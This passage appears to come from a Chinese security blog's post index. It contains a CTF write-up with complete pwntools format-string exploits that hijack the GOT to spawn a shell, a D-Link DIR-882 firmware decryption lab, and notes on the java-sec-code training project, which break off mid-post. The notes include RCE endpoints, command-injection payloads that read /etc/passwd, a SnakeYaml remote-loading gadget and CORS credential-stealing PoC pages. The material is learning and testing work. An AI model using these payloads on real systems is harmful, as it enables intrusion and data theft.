中的格式化漏洞的题目。也都是格式化字符串常见的利用。 64 位程序格式化字符串漏洞原理 其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。 例题这里，我们以 2017 年的 UIUCTF 中 pwn200 GoodLuck 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。 查看保护$ checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 可以看出程序开启了 NX 保护以及部分 RELRO 保护 分析程序可以发现，程序的漏洞很明显 for ( j = 0; j &lt;= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(&quot;You answered:&quot;); printf(format); puts(&quot;\\nBut that was totally wrong lol get rekt&quot;); fflush(_bss_start); result = 0; goto LABEL_11; } } 确定偏移我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。 gef➤ b printfBreakpoint 1 at 0x400640gef➤ rStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck what's the flag123456You answered:Breakpoint 1, __printf (format=0x602830 &quot;123456&quot;) at printf.c:2828 printf.c: 没有那个文件或目录.─────────────────────────────────────────────────────────[ code:i386:x86-64 ]──── 0x7ffff7a627f7 &lt;fprintf+135&gt; add rsp, 0xd8 0x7ffff7a627fe &lt;fprintf+142&gt; ret 0x7ffff7a627ff nop → 0x7ffff7a62800 &lt;printf+0&gt; sub rsp, 0xd8 0x7ffff7a62807 &lt;printf+7&gt; test al, al 0x7ffff7a62809 &lt;printf+9&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7a6280e &lt;printf+14&gt; mov QWORD PTR [rsp+0x30], rdx───────────────────────────────────────────────────────────────────────[ stack ]────['0x7fffffffdb08', 'l8']80x00007fffffffdb08│+0x00: 0x0000000000400890 → &lt;main+234&gt; mov edi, 0x4009b8 ← $rsp0x00007fffffffdb10│+0x08: 0x00000000310000010x00007fffffffdb18│+0x10: 0x0000000000602830 → 0x0000363534333231 (&quot;123456&quot;?)0x00007fffffffdb20│+0x18: 0x0000000000602010 → &quot;You answered:\\ng&quot;0x00007fffffffdb28│+0x20: 0x00007fffffffdb30 → &quot;flag{11111111111111111&quot;0x00007fffffffdb30│+0x28: &quot;flag{11111111111111111&quot;0x00007fffffffdb38│+0x30: &quot;11111111111111&quot;0x00007fffffffdb40│+0x38: 0x0000313131313131 (&quot;111111&quot;?)──────────────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 &quot;123456&quot;)[#1] 0x400890 → Name: main() 以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 %order$s 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 %9$s 即可得到 flag 的内容。当然，我们还有更简单的方法利用 https://github.com/scwuaptx/Pwngdb 中的 fmtarg 来判断某个参数的偏移。 ps:这里的10是由5+5得到的，至于为什么是这两个5是从哪里的得到的，我来解释一下，前面的5: 由于64为程序，前64个参数是存在寄存器中的，分别是rdi, rsi, rcx, rdx, r8, r9 所以第一格式化字符串是存储rdi中的，所以flag对应的偏移就应该是在 5 + flag 在线中的偏移，在栈中的偏移就很多理解了就是5，所以flag对应的格式化字符串偏移为10 gef➤ fmtarg 0x00007fffffffdb28The index of format argument : 10 (&quot;\\%9$p&quot;) 需要注意的是我们必须 break 在 printf 处。 exp:from pwn import *from LibcSearcher import *goodluck = ELF('./goodluck')if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017)else: sh = process('./goodluck')payload = &quot;%9$s&quot;print payload##gdb.attach(sh)sh.sendline(payload)print sh.recv()sh.interactive() 运行结果[+] Starting local process './goodluck': pid 3129%9$s[*] Process './goodluck' stopped with exit code 0 (pid 3129)what's the flagYou answered:flag{11111111111111}\\xffBut that was totally wrong lol get rekt hijack GOT原理在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。 假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤 确定函数 A 的 GOT 表地址。 这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。 确定函数 B 的内存地址 这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。 将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。 这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种 写入函数：write 函数。 ROP pop eax; ret; # printf@got -&gt; eaxpop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebxadd [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset 格式化字符串任意地址写 例题这里我们以 2016 CCTF 中的 pwn3 为例进行介绍。 查看保护[*] '/home/oldthree/Desktop/pwn3' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。 分析程序首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞 int get_file(){ char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(&quot;enter the file name you want to get:&quot;); __isoc99_scanf(&quot;%40s&quot;, &amp;s1); if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) ) puts(&quot;too young, too simple&quot;); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &amp;s1) ) { strcpy(&amp;dest, i + 0x28); return printf(&amp;dest); } } return printf(&amp;dest);} 漏洞利用思路既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路 绕过密码 确定格式化字符串参数偏移 利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。 修改 puts@got 的内容为 system 的地址。 当程序再次执行 puts 函数的时候，其实执行的是 system 函数。 expfrom pwn import *from LibcSearcher import LibcSearcher##context.log_level = 'debug'pwn3 = ELF('./pwn3')if args['REMOTE']: sh = remote('111', 111)else: sh = process('./pwn3')def get(name): sh.sendline('get') sh.recvuntil('enter the file name you want to get:') sh.sendline(name) data = sh.recv() return datadef put(name, content): sh.sendline('put') sh.recvuntil('please enter the name of the file you want to upload:') sh.sendline(name) sh.recvuntil('then, enter the content:') sh.sendline(content)def show_dir(): sh.sendline('dir')tmp = 'sysbdmin'name = &quot;&quot;for i in tmp: name += chr(ord(i) - 1)## passworddef password(): sh.recvuntil('Name (ftp.hacker.server:Rainism):') sh.sendline(name)##passwordpassword()## get the addr of putsputs_got = pwn3.got['puts']log.success('puts got : ' + hex(puts_got))put('1111', '%8$s' + p32(puts_got))puts_addr = u32(get('1111')[:4])## get addr of systemlibc = LibcSearcher(&quot;puts&quot;, puts_addr)system_offset = libc.dump('system')puts_offset = libc.dump('puts')system_addr = puts_addr - puts_offset + system_offsetlog.success('system addr : ' + hex(system_addr))## modify puts@got, point to system_addrpayload = fmtstr_payload(7, {puts_got: system_addr})put('/bin/sh;', payload)sh.recvuntil('ftp&gt;')sh.sendline('get')sh.recvuntil('enter the file name you want to get:')##gdb.attach(sh)sh.sendline('/bin/sh;')## system('/bin/sh')show_dir()sh.interactive() 注意 我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。 这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。","link":"/2021/02/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"},{"title":"D-Link DIR-882固件解密实验","text":"0x01 实验目的 通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行 0x02 概述固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图 是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。 0x03 实验环境服务器：attify os 辅助工具：firmwalk.sh(以及3个固件都在附件里) 0x04 实验操作在本次实验中，我们首先将研究路由器固件升级常见的一种方案，并找到该方案 的漏洞所在，通过实际分析相关的几个固件，最后对新版加密固件的文件系统的 提取。 12用户名：iot 密码：attify数据库：postgre 密码：firmadyne 这次的实验，我们以 D-Link DIR-882 固件为例。我们在分析固件时会发现它被 加密过了，使用 binwalk 根本无法探测，比如这次的固件 v1.20b06 这时候我们可以考虑通过分析旧版本的固件尝试是否有什么线索来解密现在这 个新版本的固件 在 这 里 我 们 可 以 找 到 所 有 旧 版 本 的 固 件 （ ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/ ） ， 我 们 找 个 最 早 的 版 本 v1.00b07，下载来后解压尝试binwalk读取 可以看到能识别出信息，或者说是没有加密过的。 那再看看稍微新一点的版本 v1.10b02 可以看到有两个 bin 文件，说明 1.04b02 的过渡版本，它包含在 v1.10b02 固件包 汇中，名字也已经告诉我们了，1.04b02 是未加密的 分别使用 binwalk 而加密后的固件却什么也看不到 我们把 1.04b02 提取出来 进入生成的文件夹 注意到有两个文件，使用 binwalk 提取 A0 进入新文件夹 再次提取8AB758最近进入文件夹 注意到这里有一个 Imgdecrypt 的文件，看名字，应该是用来解密镜像的 file 查看 发现是个可执行文件，尝试执行，缺少相应的 so 文件，这很正常，因为这个文 件是写在 mips 架构上运行的，而我们目前是 x86 为了运行它，我们使用 qemy-mipsel-static 首先将其复制到固件根文件系统的/usr/bin 目录下 在将前面发现是加密的固件 1.20b06 复制过来 1sudo chroot . ./qemu-mipsel-static ./bin/sh 接着还是同样的办法模拟 mips 架构拿到 shell 此时再执行 imgdecrypt 可以看到 打印出了使用方法 按照其提示，可以看到对原来加密的固件进行了解密 操作如上图所示 这时候再次使用 binwalk 查看被解密后的固件，可以看到已经可以识别了 这给我们的启示就是，在碰到加密的固件时，可以考率查找位于同一产品线、具 有相同处理器体系结构的路由器固件，找那些版本旧一些的，或者过渡版本，或 许就能为我们提供线索。 我们使用 binwalk 如之前未加密的固件一般一步步提取 0x05 敏感信息分析可以看到文件系统都被提取出来了 这里介绍一个常用的小工具 firmwalk.sh 它将搜索固件文件系统，以获取与敏感信息相关的东西，如： 12345678910etc/shadow and etc/passwd列出 etc/ssl 目录搜索相关的文件，如. pem,. crt, 等。搜索配置文件查找脚本文件搜索其他. bin 文件查找诸如管理员。密码。远程等关键字。搜索在 IoT 设备上使用的通用网络服务器搜索常见的二进制文件，如 ssh。tftp。dropbear 等。搜索网址，电子邮件地址和 IP 地址 我们可以使用它来看看这个文件系统中有哪些敏感信息 命令为./firmwalker.sh 文件系统的路径 password关键字文件 ssl相关文件 私钥相关文件 telnel相关文件","link":"/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/"},{"title":"Java-sec-code学习记录","text":"0x00 前言​ 最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程 0x01环境配置Mac os 11.2.2tomcat 8.5ideamsyql 8.0.70 导入idea项目\u0004\u0003配置本地tomcat git clone https://github.com/JoyChou93/java-sec-codecd java-sec-codemvn clean package 打开浏览器访问127.0.0.1:8080 输入密码admin/admin123进行登陆 0x02 漏洞分析1. RceJava命令执行的几种方式1）Runtime 类执行系统命令核心代码： Process p = Runtime.getRuntime().exec(&quot;calc&quot;); 详细代码： import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;public class Runtime1 { public static void main(String[] args) { try { Process p = Runtime.getRuntime().exec(&quot;whoami&quot;); InputStream input = p.getInputStream(); InputStreamReader ins = new InputStreamReader(input, &quot;utf-8&quot;); //InputStreamReader 字节流到字符流，并指定编码格式 BufferedReader br = new BufferedReader(ins); //BufferedReader 从字符流读取文件并缓存字符 String line; line = br.readLine(); System.out.println(line); br.close(); ins.close(); input.close(); } catch (IOException e) { e.printStackTrace(); } }} 通过Runtime类exec方法执行命令获取输入流getInputStream()，再InputStreamReader过渡到字符流，并指定gbk的编码格式。BufferedReader 再从字符输入流中读取文本并缓冲字符。再通过readLine()方法打印出结果。 访问http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami 查看Rce代码如下 public class Rce { @GetMapping(&quot;/exec&quot;) public String CommandExec(String cmd) { Runtime run = Runtime.getRuntime(); StringBuilder sb = new StringBuilder(); try { Process p = run.exec(cmd); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String tmpStr; while ((tmpStr = inBr.readLine()) != null) { sb.append(tmpStr); } if (p.waitFor() != 0) { if (p.exitValue() == 1) return &quot;Command exec failed!!&quot;; } inBr.close(); in.close(); } catch (Exception e) { return e.toString(); } return sb.toString(); }} Idea调试情况如下 2）ProcessBuilder 类命令执行ProcessBuilder类通过创建系统进程执行命令。 核心代码 ProcessBuilder builder = new ProcessBuilder(&quot;whoami&quot;);Process process = builder.start(); 详细代码： import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;public class ProcessBuilder1 { public static void main(String[] args) { try { String[] cmds = new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;whoami&quot;}; ProcessBuilder builder = new ProcessBuilder(cmds); Process process = builder.start(); InputStream in = process.getInputStream(); //获取输入流 InputStreamReader ins = new InputStreamReader(in, &quot;utf-8&quot;); // 字节流转化为字符流，并指定编码格式 char[] chs = new char[1024]; int len = ins.read(chs); System.out.println(new String(chs,0,len)); ins.close(); in.close(); } catch (IOException e) { e.printStackTrace(); } }} 通过ProcessBuilder类执行系统命令获取结果。注意将命令隔开，同样转化为字符流InputStreamReader，并指定编码格式。read方法读取该字符流。将结果转化为字符串进行输出。 打开http://localhost:8080/java_sec_code_war/rce/ProcessBuilder?cmd=whoami Java-sec-code如下： /** * http://localhost:8080/rce/ProcessBuilder?cmd=whoami * @param cmd cmd */@GetMapping(&quot;/ProcessBuilder&quot;)public String processBuilder(String cmd) { StringBuilder sb = new StringBuilder(); try { String[] arrCmd = {&quot;/bin/sh&quot;, &quot;-c&quot;, cmd}; ProcessBuilder processBuilder = new ProcessBuilder(arrCmd); Process p = processBuilder.start(); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String tmpStr; while ((tmpStr = inBr.readLine()) != null) { sb.append(tmpStr); } } catch (Exception e) { return e.toString(); } return sb.toString();} Idea调试如下 3) 反射调用Processlmpl 类执行系统命令Runtime和ProcessBuilder执行命令实际上调用了也是ProcessImpl类。对于该类，没有构造方法，只有一个private类型的方法。可以通过反射调用。 核心代码： Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class);method.setAccessible(true);Process e = (Process) method.invoke(null, new String[]{&quot;calc&quot;}, null, &quot;.&quot;, null, true); 详细代码： import java.io.ByteArrayOutputStream;import java.lang.ProcessBuilder.Redirect;import java.lang.reflect.Method;import java.util.Map;@SuppressWarnings(&quot;unchecked&quot;)public class ProcessImpl1{ public static void main(String[] args) throws Exception { String[] cmds = new String[]{&quot;whoami&quot;}; Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class); method.setAccessible(true); Process e = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true); byte[] bs = new byte[2048]; int readSize = 0; ByteArrayOutputStream infoStream = new ByteArrayOutputStream(); while ((readSize = e.getInputStream().read(bs)) &gt; 0) { infoStream.write(bs, 0, readSize); } System.out.println(infoStream.toString()); }} 从ProcessImpl类的class对象中获取到方法然后反射调用，获取字节输入流getInputStream的结果。ByteArrayOutputStream 创建字节数组缓冲区。read() 方法读取字节流大小，并写进缓冲区。最后将缓冲区结果转化为字符串，并指定utf-8编码格式输出。 4) 反射调用Runtime类执行系统命令核心代码： Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Constructor constructor = clazz.getDeclaredConstructor();constructor.setAccessible(true);Object runtimeInstance = constructor.newInstance();Method runtimeMethod = clazz.getMethod(&quot;exec&quot;, String.class);Process process = (Process) runtimeMethod.invoke(runtimeInstance, &quot;calc&quot;); java.lang.Runtime类的无参构造方法私有的，可以通过反射修改方法的访问权限setAccessible，强制可以访问，然后获取类构造器的方法。再通过类加载newInstance()创建对象，反射再调用方法。 详细代码： import java.io.ByteArrayOutputStream;import java.lang.ProcessBuilder.Redirect;import java.lang.reflect.Method;import java.util.Map;@SuppressWarnings(&quot;unchecked&quot;)public class ProcessImpl1{ public static void main(String[] args) throws Exception { String[] cmds = new String[]{&quot;whoami&quot;}; Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, Redirect[].class, boolean.class); method.setAccessible(true); Process e = (Process) method.invoke(null, cmds, null, &quot;.&quot;, null, true); byte[] bs = new byte[2048]; int readSize = 0; ByteArrayOutputStream infoStream = new ByteArrayOutputStream(); while ((readSize = e.getInputStream().read(bs)) &gt; 0) { infoStream.write(bs, 0, readSize); } System.out.println(infoStream.toString()); }} 5) JavaScript命令执行javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码. 核心代码： String str = &quot;Jscode&quot;; ScriptEngineManager manager = new ScriptEngineManager(null); ScriptEngine engine = manager.getEngineByName(&quot;js&quot;); engine.eval(str); 详细代码： import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;import javax.script.ScriptException;public class Jsexec { public static void main(String[] argv) throws ScriptException { String str = &quot;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\&quot;open -a Calculator\\&quot;);&quot;; ScriptEngineManager manager = new ScriptEngineManager(null); ScriptEngine engine = manager.getEngineByName(&quot;js&quot;); engine.eval(str); }} 如上。可以成功弹出计算器,如果遇到关键字检测。还可以用注释和空格绕过。 查看Java-sec-code代码 /** * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js * * curl http://xx.yy/zz.js * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);} * * @param jsurl js url */@GetMapping(&quot;/jscmd&quot;)public void jsEngine(String jsurl) throws Exception{ // js nashorn javascript ecmascript ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;); Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE); String cmd = String.format(&quot;load(\\&quot;%s\\&quot;)&quot;, jsurl); engine.eval(cmd, bindings);} 用Python本地起一个服务器，写入JS进行触发 6）Yaml反序列化命令执行SnakeYaml是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。 核心代码： @GetMapping(&quot;/vuln/yarm&quot;)public void yarm(String agrs) { String content = &quot;!!javax.script.ScriptEngineManager [\\n&quot; + &quot; !!java.net.URLClassLoader [[\\n&quot; + &quot; !!java.net.URL [\\&quot;http://o5s7wr.dnslog.cn\\&quot;]\\n&quot; + &quot; ]]\\n&quot; + &quot;]&quot;; Yaml y = new Yaml(); y.load(content);} 进行测试 使用师傅写好的利用脚本进行利用利用 https://github.com/artsploit/yaml-payload 打开并修改代码： package artsploit;import javax.script.ScriptEngine;import javax.script.ScriptEngineFactory;import java.io.IOException;import java.util.List;public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(&quot;open -a Calculator&quot;); } catch (IOException e) { e.printStackTrace(); } } @Override public String getEngineName() { return null; } @Override public String getEngineVersion() { return null; } @Override public List&lt;String&gt; getExtensions() { return null; } @Override public List&lt;String&gt; getMimeTypes() { return null; } @Override public List&lt;String&gt; getNames() { return null; } @Override public String getLanguageName() { return null; } @Override public String getLanguageVersion() { return null; } @Override public Object getParameter(String key) { return null; } @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; } @Override public String getOutputStatement(String toDisplay) { return null; } @Override public String getProgram(String... statements) { return null; } @Override public ScriptEngine getScriptEngine() { return null; }} 整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。 JavaSPI机制详解 使用Python搭建简单的WEB服务后进行利用 7）Groovy 命令执行Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。 可以使用GroovyShell类来执行任何Groovy脚本 代码如下： /** * http://localhost:8080/rce/groovy?content=&quot;open -a Calculator&quot;.execute() * @param content groovy shell */@GetMapping(&quot;/groovy&quot;)public void groovyshell(String content) { GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(content);} 进行利用如下： 2. CommandInject命令行直接对请求参数进行拼接，可利用特殊字符分割执行其他命令 1.参数注入代码如下： /** * http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd * * @param filepath filepath * @return result */@GetMapping(&quot;/codeinject&quot;)public String codeInject(String filepath) throws IOException { String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream());} 访问http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd 2.Host注入在HTTP请求的host中命令执行 代码如下： /** * Host Injection * Host: hacked by joychou;cat /etc/passwd * http://localhost:8080/codeinject/host */@GetMapping(&quot;/codeinject/host&quot;)public String codeInjectHost(HttpServletRequest request) throws IOException { String host = request.getHeader(&quot;host&quot;); logger.info(host); String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream());} dnslog进行测试 进行命令注入时失败： 查找半天原因之后发现 \u0011是tomcat的版本问题,tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误, 这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])。 建议大家下一个低版本进行测试～ 修复代码@GetMapping(&quot;/codeinject/sec&quot;)public String codeInjectSec(String filepath) throws IOException { String filterFilePath = SecurityUtil.cmdFilter(filepath); if (null == filterFilePath) { return &quot;Bad boy. I got u.&quot;; } String[] cmdList = new String[]{&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream());} 增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看 public static String cmdFilter(String input) { if (!FILTER_PATTERN.matcher(input).matches()) { return null; } return input;} 继续跟进FILTER_PATTERN函数 private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;); 3. Broken Access Control某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick，导致越权问题。具体写法可能有Cookies代码里的几种情况。 代码有如下几种情况： /** * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。 */@RestController@RequestMapping(&quot;/cookie&quot;)public class Cookies { private static String NICK = &quot;nick&quot;; @GetMapping(value = &quot;/vuln01&quot;) public String vuln01(HttpServletRequest req) { String nick = WebUtils.getCookieValueByName(req, NICK); // key code return &quot;Cookie nick: &quot; + nick; } @GetMapping(value = &quot;/vuln02&quot;) public String vuln02(HttpServletRequest req) { String nick = null; Cookie[] cookie = req.getCookies(); if (cookie != null) { nick = getCookie(req, NICK).getValue(); // key code } return &quot;Cookie nick: &quot; + nick; } @GetMapping(value = &quot;/vuln03&quot;) public String vuln03(HttpServletRequest req) { String nick = null; Cookie cookies[] = req.getCookies(); if (cookies != null) { for (Cookie cookie : cookies) { // key code. Equals can also be equalsIgnoreCase. if (NICK.equals(cookie.getName())) { nick = cookie.getValue(); } } } return &quot;Cookie nick: &quot; + nick; } @GetMapping(value = &quot;/vuln04&quot;) public String vuln04(HttpServletRequest req) { String nick = null; Cookie cookies[] = req.getCookies(); if (cookies != null) { for (Cookie cookie : cookies) { if (cookie.getName().equalsIgnoreCase(NICK)) { // key code nick = cookie.getValue(); } } } return &quot;Cookie nick: &quot; + nick; } @GetMapping(value = &quot;/vuln05&quot;) public String vuln05(@CookieValue(&quot;nick&quot;) String nick) { return &quot;Cookie nick: &quot; + nick; } @GetMapping(value = &quot;/vuln06&quot;) public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) { return &quot;Cookie nick: &quot; + nick; }} 打开http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现 4. Cors跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。 前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法： XMLHttpRequest JQuery的$.ajax Fetch 前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin)，那么Response的header中不会出现Access-Control-Allow-Origin，因为Origin为空。 在这样配置可以去访问任何服务资源 Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 可以用curl来验证 curl -i $'GET' \\ -H $'Origin: http://www.baidu.com' \\ -b $'remember-me=YWRtaW46MTYzMTY5MTA4NTA2OTpkZWYwZTFiYjc2MmZhYzFiMzdjMDc2MzNiYjcxOGJkOQ; JSESSIONID=2F6ED87C606984C0547455D72FE2B9EE; XSRF-TOKEN=1536dc0b-8b8b-4955-b669-c5b9f9b4bd6d' \\ $'http://172.20.10.6:8080/java_sec_code_war/cors/vuln/origin' Java-sec-code需要cookie来利用无cooike的poc如下 GET： &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CORS TEST&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id='output'&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://vuln.com/xxxx',true); //req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;); req.withCredentials = true; req.send(); function reqListener() { var output = document.getElementById('output'); output.innerHTML = &quot;URL: http://vuln.com/xxxx&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;&quot; + req.responseText + &quot;&lt;/textarea&gt;&quot;; }; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; POST： &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CORS TEST&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id='output'&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var req = new XMLHttpRequest(); var data = &quot;userId%3Dadmin&quot;; req.onload = reqListener; req.open('post','http://vuln.com/xxxx',true); req.setRequestHeader(&quot;Content-Type&quot;,&quot;xxx&quot;); req.withCredentials = true; req.send(data); function reqListener() { var output = document.getElementById('output'); output.innerHTML = &quot;URL: http://vuln.com/xxxx&lt;br&gt;Data: userId%3Dadmin&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;&quot; + req.responseText + &quot;&lt;/textarea&gt;&quot;; }; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 核心代码如下： private static String info = &quot;{\\&quot;name\\&quot;: \\&quot;JoyChou\\&quot;, \\&quot;phone\\&quot;: \\&quot;18200001111\\&quot;}&quot;;@GetMapping(&quot;/vuln/origin&quot;)public String vuls1(HttpServletRequest request, HttpServletResponse response) { String origin = 